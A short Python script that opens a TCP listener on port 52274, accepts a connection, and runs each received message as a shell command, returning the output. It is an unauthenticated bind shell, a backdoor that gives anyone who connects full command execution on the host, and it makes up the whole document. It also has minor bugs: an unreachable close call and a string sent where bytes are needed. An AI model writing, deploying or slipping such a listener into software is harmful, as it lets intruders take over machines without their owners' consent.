import subprocess
import socket


def process(message):
    proc = subprocess.Popen(message,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
    output = proc.communicate()[0]
    return output


def server():
    Socket=socket.socket()
    host = socket.gethostname()
    port = 52274
    
    Socket.bind((host, port))
    Socket.listen(1)
    c,address = Socket.accept()
    print(f"Connected to: {address} as server")

    try:
        while True:
            message=c.recv(1024).decode()
            print("msg received in server")
            output = process(message)
            
            if (output == b""):
                output += b"Output was empty"
            c.sendall(output)
            print("msg sent from server")
            print(output)
        c.close()
    except:
        c.sendall("error occured")
        pass





server()

